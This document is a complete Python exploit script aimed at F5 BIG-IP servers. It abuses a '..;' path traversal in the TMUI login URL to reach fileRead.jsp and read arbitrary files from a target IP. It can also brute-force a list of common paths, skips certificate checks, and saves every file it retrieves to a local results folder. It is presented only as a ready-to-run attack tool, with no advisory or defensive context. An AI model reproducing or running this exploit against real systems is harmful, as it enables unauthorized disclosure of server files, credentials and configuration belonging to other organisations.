try:
        import urllib3, os, sys
        urllib3.disable_warnings()
        from requests import get as GET
        from argparse import ArgumentParser
except ImportError as err:
        exit(err)

class Fore:
    BOLD = "\033[1m"
    UNDE = "\033[4m"
    GREEN = "\033[92m"
    BLUE = "\033[94m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    WHITE = "\033[0m"
    CYAN = "\033[0;36m"

# read file contains a common paths to brute force
def readPathFile():
        paths = []
        with open('common_path.txt', 'r') as f:
                for _ in f.readlines():
                        paths.append(_.strip())

        f.close()
        return paths

def writeToFile(ip, filename, data):
        filename = filename.replace('/', '-')
        f = open(f'results/{ip}/{filename}_.txt', 'w')
        f.write(data)

def send_request(ip: str, filename: str) -> str:
        r = GET(f"https://{ip}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName={filename}", verify=False)
        try:
                data = r.json()
                output = data["output"]
        except:
                #print("[-] Exploit Failed.")
                return
        #print("[+] Exploit Successfull.")
        return output


def main():
        parser = ArgumentParser()
        parser.add_argument('-ip', '--ip', help='F5 Big IP Server IP', required=True)
        parser.add_argument('-f', '--file', help='File path you want to read in the Server')
        parser.add_argument('-b', '--brute', help='brute force files', action="store_true")
        args = parser.parse_args()
        if not os.path.exists("results"):
                os.mkdir("results")
        if not os.path.exists(f"results/{args.ip}"):
                os.mkdir(f"results/{args.ip}")
        if args.file:
                out = send_request(args.ip, args.file)
                if out != None:
                        print(f"\033[G\033[K{Fore.BLUE}[*] {Fore.WHITE}trying {Fore.YELLOW}'{Fore.WHITE}{args.file}{Fore.YELLOW}'{Fore.WHITE} ... {Fore.GREEN}file saved.")
                        writeToFile(args.ip, args.file, out)
                        print(f"{Fore.WHITE}{out}")
                else:
                        print(f"\033[G\033[K{Fore.BLUE}[*] {Fore.WHITE}trying {Fore.YELLOW}'{Fore.WHITE}{args.file}{Fore.YELLOW}'{Fore.WHITE} ... {Fore.RED}error.")
                #sys.stdout.flush()
        else:
                count = 0
                paths = readPathFile()
                for p in paths:
                        #print("") # clean the line to print on it again

                        out = send_request(args.ip, p)
                        if out != None:
                                print(f"\033[G\033[K{Fore.BLUE}[*] {Fore.WHITE}trying {Fore.YELLOW}'{Fore.WHITE}{p}{Fore.YELLOW}'{Fore.WHITE} ... {Fore.GREEN}file saved.", end="")
                                writeToFile(args.ip, p, out)
                                #print(out)
                                count+=1
                        else:
                                print(f"\033[G\033[K{Fore.BLUE}[*] {Fore.WHITE}trying {Fore.YELLOW}'{Fore.WHITE}{p}{Fore.YELLOW}'{Fore.WHITE} ... {Fore.RED}error.", end="")
                        sys.stdout.flush()
                current_dir = os.path.join(os.getcwd(), f"results/{args.ip}")
                print(f"\n{Fore.GREEN}[+]{Fore.WHITE} found {Fore.GREEN}{str(count)}{Fore.WHITE} file(s).")
                print(f"{Fore.GREEN}[+]{Fore.WHITE} all files saved on {Fore.YELLOW}'{Fore.CYAN}{current_dir}{Fore.YELLOW}'{Fore.WHITE}.")

if __name__ == "__main__":
        try:
                main()
        except KeyboardInterrupt:
                exit(f'\n{Fore.RED}CTRL + C detected ... exiting{Fore.WHITE}')